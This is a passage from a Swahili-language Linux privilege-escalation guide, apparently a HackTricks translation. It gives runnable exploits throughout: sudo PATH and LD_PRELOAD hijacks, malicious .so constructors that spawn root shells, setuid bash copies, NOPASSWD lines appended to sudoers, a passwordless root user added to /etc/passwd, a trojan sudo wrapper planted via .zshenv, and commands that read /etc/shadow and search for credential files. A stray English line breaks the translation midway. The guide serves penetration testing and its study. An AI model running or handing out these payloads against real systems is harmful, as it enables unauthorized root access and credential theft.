- Mahitaji: sudo rule (mara nyingi `NOPASSWD`) inayoendesha script/binary inayokiita commands bila absolute paths (`free`, `df`, `ps`, n.k.) na PATH entry inayoweza kuandikwa ambayo hutafutwa kwanza.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Kupita paths za utekelezaji wa Sudo
**Jump** ili kusoma faili nyingine au kutumia **symlinks**. Kwa mfano katika sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** imetumika (\*), huwa rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila command path

Ikiwa **ruhusa ya sudo** imetolewa kwa command moja **bila kubainisha path**: _hacker10 ALL= (root) less_ unaweza kuitumia vibaya kwa kubadilisha variable ya PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **inatekeleza amri nyingine bila kubainisha path yake (kila mara hakikisha kwa kutumia** _**strings**_ **maudhui ya binary ya ajabu ya SUID)**.

[Mifano ya Payload za kutekeleza.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binary ya SUID yenye path ya amri

Ikiwa binary ya **suid** **inatekeleza amri nyingine ikibainisha path**, basi unaweza kujaribu **ku-export function** yenye jina sawa na amri inayoitwa na faili ya suid.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_, unapaswa kujaribu kuunda function hiyo na kuifanya iwe exported:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapopiga simu kwa suid binary, function hii itatekelezwa

### Script inayoweza kuandikwa inayotekelezwa na SUID wrapper

Usanidi usio sahihi wa custom-app unaopatikana mara kwa mara ni SUID binary wrapper inayomilikiwa na root na kutekeleza script, huku script yenyewe ikiwa inaweza kuandikwa na low-priv users.

Muundo wa kawaida:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Ikiwa `/usr/local/bin/backup.sh` inaweza kuandikwa, unaweza kuongeza payload commands kisha utekeleze SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Ukaguzi wa haraka:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Njia hii ya shambulio ni ya kawaida hasa katika wrappers za "maintenance"/"backup" zinazokuja katika `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Variable ya mazingira ya **LD_PRELOAD** hutumika kubainisha shared libraries moja au zaidi (faili za .so) zitakazopakiwa na loader kabla ya nyingine zote, ikiwemo standard C library (`libc.so`). Mchakato huu unajulikana kama preloading a library.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumiwa vibaya, hasa kwenye executables za **suid/sgid**, mfumo huweka masharti fulani:

- Loader hupuuza **LD_PRELOAD** kwa executables ambazo real user ID (_ruid_) hailingani na effective user ID (_euid_).
- Kwa executables zenye suid/sgid, ni libraries zilizo katika standard paths ambazo pia ni suid/sgid pekee hupakiwa.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kutekeleza commands kwa `sudo` na output ya `sudo -l` inajumuisha statement **env_keep+=LD_PRELOAD**. Configuration hii huruhusu variable ya mazingira ya **LD_PRELOAD** kuendelea kuwepo na kutambuliwa hata commands zinapoendeshwa kwa `sudo`, hali inayoweza kusababisha arbitrary code kutekelezwa kwa elevated privileges.<sup>[[9]](#references)</sup>
```
Defaults        env_keep += LD_PRELOAD
```
I can’t save files directly.
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **ongeza privileges** ukiendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc inayofanana inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti env variable **LD_LIBRARY_PATH**, kwa sababu anadhibiti path ambayo libraries zitatutafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye permissions za **SUID** ambayo inaonekana si ya kawaida, ni desturi nzuri kuthibitisha ikiwa inapakia files za **.so** ipasavyo. Hili linaweza kukaguliwa kwa kuendesha command ifuatayo:<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaashiria uwezekano wa exploitation.

Ili kuitumia vibaya, mtu angeendelea kwa kuunda faili la C, kwa mfano _"/path/to/.config/libcalc.c"_, lenye code ifuatayo:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Code hii, baada ya ku-compile na ku-execute, inalenga kuongeza privileges kwa ku-manipulate file permissions na ku-execute shell yenye privileges zilizoinuliwa.

Compile C file iliyo hapo juu kuwa shared object (.so) file kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha binary ya SUID iliyoathiriwa kunapaswa kuanzisha exploit, na hivyo kuwezesha uwezekano wa system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa kwa kuwa tumepata binary ya SUID inayopakia library kutoka kwenye folder tunakoweza kuandika, hebu tuunde library hiyo kwenye folder hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ukipata hitilafu kama vile
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hiyo inamaanisha kwamba library uliyotengeneza inahitaji kuwa na function inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyoratibiwa ya Unix binaries ambazo zinaweza kutumiwa na attacker kukwepa vikwazo vya local security. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa, lakini kwa hali ambapo unaweza **ku-inject arguments pekee** kwenye command.

Project hii hukusanya functions halali za Unix binaries ambazo zinaweza kutumiwa vibaya ili kutoroka restricted shells, kuongeza au kudumisha elevated privileges, kuhamisha files, kuanzisha bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l`, unaweza kutumia tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia ikiwa inapata jinsi ya kutumia vibaya sudo rule yoyote.

### Kutumia Tena Sudo Tokens

Katika hali ambapo una **sudo access** lakini huna password, unaweza kuongeza privileges kwa **kusubiri command ya sudo itekelezwe, kisha ku-hijack session token**.<sup>[[18]](#references)</sup>

Requirements za kuongeza privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" **ametumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa default, hiyo ndiyo muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza password)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza ku-upload)

(Unaweza kuwasha `ptrace_scope` kwa muda kwa kutumia `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`, au kuibadilisha kabisa katika `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa requirements hizi zote zimetimizwa, **unaweza kuongeza privileges ukitumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Exploit ya kwanza** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **ku-activate sudo token katika session yako** (hutapata root shell automatically; tekeleza `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda shell ya sh katika _/tmp_ **inayomilikiwa na root yenye setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Exploit ya tatu** (`exploit_v3.sh`) ita **unda sudoers file** inayofanya **sudo tokens ziwe za kudumu na kuruhusu users wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **ruhusa za kuandika** kwenye folda au kwenye faili zozote zilizoundwa ndani ya folda hiyo, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **kuunda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kubadilisha faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo yenye PID 1234, unaweza **kupata sudo privileges** bila kuhitaji kujua password kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizo ndani ya `/etc/sudoers.d` husanidi ni nani anayeweza kutumia `sudo` na kwa njia gani. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na mtumiaji root na kundi root**.\
**Ikiwa** unaweza **kusoma** faili hii, huenda ukaweza **kupata taarifa fulani za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **kuongeza privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya alternatives za binary ya `sudo` kama vile `doas` kwa OpenBSD, kumbuka kuangalia configuration yake kwenye `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Ikiwa `doas` inaruhusu editor au interpreter, angalia escapes za mtindo wa GTFOBins:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Ikiwa unajua kwamba **user kwa kawaida huunganisha kwenye mashine na hutumia `sudo`** ili kuongeza privileges na umepata shell ndani ya context ya user huyo, unaweza **kuunda sudo executable mpya** ambayo itatekeleza code yako kama root, kisha itekeleze command ya user. Halafu, **badilisha $PATH** ya context ya user (kwa mfano, ukiongeza path mpya kwenye .bash_profile) ili user anapotekeleza sudo, sudo executable yako itekelezwe.

Kumbuka kwamba ikiwa user anatumia shell tofauti (isiyo bash), utahitaji kurekebisha files nyingine ili kuongeza path mpya. Kwa mfano, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) inarekebisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba ya Pamoja

### ld.so

Faili `/etc/ld.so.conf` linaonyesha **faili za configurations zilizopakiwa zinatoka wapi**. Kwa kawaida, faili hii huwa na path ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kuwa configuration files kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Configuration files hizi **zinaelekeza kwenye folders nyingine** ambako **libraries** zita **tafutwa**. Kwa mfano, maudhui ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kuwa mfumo utatafuta libraries ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu fulani **user ana write permissions** kwenye path yoyote iliyoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote iliyo ndani ya `/etc/ld.so.conf.d/`, au folder yoyote iliyo ndani ya config file katika `/etc/ld.so.conf.d/*.conf`, anaweza kuwa na uwezo wa kufanya privilege escalation.\
Angalia **jinsi ya kutumia vibaya misconfiguration hii** kwenye ukurasa ufuatao:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib kwenye `/var/tmp/flag15/`, itatumika na programu katika eneo hili kama ilivyoainishwa kwenye variable ya `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba hasidi katika `/var/tmp` ukitumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities hutoa **sehemu ya root privileges zinazopatikana kwa process**. Hii hugawanya kwa ufanisi **root privileges katika vitengo vidogo na tofauti**. Kila kimoja cha vitengo hivi kinaweza kupewa processes kwa kujitegemea. Kwa njia hii, seti kamili ya privileges hupunguzwa, na hivyo kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

Katika directory, **bit ya "execute"** inaashiria kwamba user aliyeathiriwa anaweza kuingia kwenye folder kwa kutumia "**cd**".\
Bit ya **"read"** inaashiria kwamba user anaweza **kuorodhesha** **files**, na bit ya **"write"** inaashiria kwamba user anaweza **kufuta** na **kuunda** **files** mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha safu ya pili ya discretionary permissions, yenye uwezo wa **kubatilisha ugo/rwx permissions za kawaida**. Permissions hizi huongeza udhibiti wa access ya file au directory kwa kuruhusu au kukataa rights kwa users maalum ambao si owners au sehemu ya group. Kiwango hiki cha **granularity huhakikisha usimamizi sahihi zaidi wa access**. Maelezo zaidi yanaweza kupatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Mpe** user "kali" read na write permissions juu ya file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** files zilizo na ACLs mahususi kutoka kwenye system:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Mlango wa nyuma wa ACL uliofichwa kwenye drop-in za sudoers

Usanidi usio sahihi wa kawaida ni faili linalomilikiwa na `root` katika `/etc/sudoers.d/` lenye mode `440`, ambalo bado linampa mtumiaji mwenye privileges ndogo access ya kuandika kupitia ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Ukiiona kitu kama `user:alice:rw-`, mtumiaji anaweza kuongeza sudo rule licha ya mode bits zenye vizuizi:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Hii ni njia yenye athari kubwa ya persistence/privesc kupitia ACL kwa sababu ni rahisi kuikosa katika ukaguzi unaotegemea `ls -l` pekee.

## Open shell sessions

Katika **old versions** unaweza **hijack** baadhi ya **shell** session za mtumiaji mwingine (**root**).\
Katika **newest versions** utaweza **connect** kwenye screen sessions za **mtumiaji wako mwenyewe** pekee. Hata hivyo, unaweza kupata **interesting information ndani ya session**.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Mahali pa Socket (baadhi ya systems huonyesha moja kama symlink ya nyingine): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Attach to a session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Utekaji wa tmux sessions

Hili lilikuwa tatizo kwenye **matoleo ya zamani ya tmux**. Sikuweza ku-hijack tmux (v2.1) session iliyoundwa na root nikiwa mtumiaji asiye na privileged access.

**Orodhesha tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket locations (some systems expose one as symlink of the other) - tmux sessions hijacking: tmux -S /tmp/dev sess ls List using that socket, you can start a tmux session in that socket...](<../../images/image (837).png>)

**Ambatisha kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

SSL na SSH keys zote zilizotengenezwa kwenye systems zinazotumia Debian (Ubuntu, Kubuntu, n.k.) kati ya Septemba 2006 na Mei 13, 2008 zinaweza kuathiriwa na bug hii.\
Bug hii husababishwa wakati wa kuunda ssh key mpya kwenye OS hizo, kwa kuwa **ni variations 32,768 tu zilizowezekana**. Hii inamaanisha kuwa uwezekano wote unaweza kuhesabiwa na **ukiwa na ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata uwezekano uliokwishahesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Hubainisha ikiwa password authentication inaruhusiwa. Default ni `no`.
- **PubkeyAuthentication:** Hubainisha ikiwa public key authentication inaruhusiwa. Default ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaruhusiwa, hubainisha ikiwa server inaruhusu login kwenye accounts zenye password strings tupu. Default ni `no`.

### Login control files

Files hizi huathiri nani anaweza ku-login na jinsi:

- **`/etc/nologin`**: ikiwa ipo, huzuia non-root logins na kuchapisha message yake.
- **`/etc/securetty`**: huwekea mipaka mahali ambapo root anaweza ku-login (TTY allowlist).
- **`/etc/motd`**: post-login banner (inaweza ku-leak taarifa za environment au maintenance).

### PermitRootLogin

Hubainisha ikiwa root anaweza ku-login akitumia ssh; default ni `no`. Values zinazowezekana:

- `yes`: root anaweza ku-login akitumia password na private key
- `without-password` au `prohibit-password`: root anaweza ku-login tu akitumia private key
- `forced-commands-only`: Root anaweza ku-login tu akitumia private key na ikiwa command options zimeainishwa
- `no` : hakuna

### AuthorizedKeysFile

Hubainisha files zilizo na public keys zinazoweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambayo itabadilishwa kuwa home directory. **Unaweza kuonyesha absolute paths** (zinazoanza na `/`) au **relative paths kutoka kwenye user's home**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Configuration hiyo itaonyesha kwamba ukijaribu kuingia kwa kutumia **private** key ya mtumiaji "**testusername**", ssh italinganisha public key ya key yako na zile zilizoko kwenye `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding hukuruhusu **kutumia SSH keys zako za ndani badala ya kuacha keys** (bila passphrases!) zikiwa kwenye server yako. Kwa hiyo, utaweza **kuruka** kupitia ssh **kwenda kwenye host** na kutoka hapo **kuruka kwenda kwenye** host **nyingine kwa kutumia** **key** iliyoko kwenye **host yako ya awali**.

Unahitaji kuweka option hii kwenye `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*` kila mara mtumiaji anapohamia kwenye mashine tofauti, host hiyo itaweza kufikia keys (ambalo ni suala la usalama).

Faili `/etc/ssh_config` inaweza **kubatilisha** **options** hizi na kuruhusu au kukataa configuration hii.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa kutumia keyword `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

Ukipata kwamba Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwa sababu **huenda ukaweza kuitumia vibaya ili kuongeza privileges**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripts zinazotekelezwa mtumiaji anapoanzisha shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kurekebisha yoyote kati ya hizo, unaweza kuongeza privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa script yoyote ya profile isiyo ya kawaida itapatikana, unapaswa kuikagua ili kutafuta **maelezo nyeti**.

### Faili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kutumia jina tofauti au kunaweza kuwa na backup. Kwa hivyo inashauriwa **kutafuta zote** na **kuangalia kama unaweza kuzisoma** ili kuona **ikiwa kuna hashes** ndani ya faili hizo:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili la `/etc/passwd` (au faili linalolingana)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd Inayoweza Kuandikwa

Kwanza, tengeneza password kwa kutumia mojawapo ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Kisha ongeza mtumiaji `hacker` na uongeze nenosiri lililozalishwa.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` kwa `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza dummy user bila password.\
WARNING: unaweza kupunguza usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
KUMBUKA: Katika platforms za BSD, `/etc/passwd` inapatikana kwenye `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imepewa jina jipya kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika kwenye baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika kwenye **service configuration file**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha **tomcat** server na unaweza **kurekebisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kurekebisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa wakati tomcat itakapoanzishwa tena.

### Kagua Folda

Folda zifuatazo zinaweza kuwa na nakala rudufu au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hutaweza kusoma ya mwisho, lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Faili za Mahali pa Ajabu/Zinazomilikiwa
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizorekebishwa katika dakika za hivi karibuni
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za DB za Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml faili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Nakala za akiba**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zilizo na passwords

Soma code ya [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), hutafuta **faili kadhaa zinazowezekana kuwa na passwords**.\
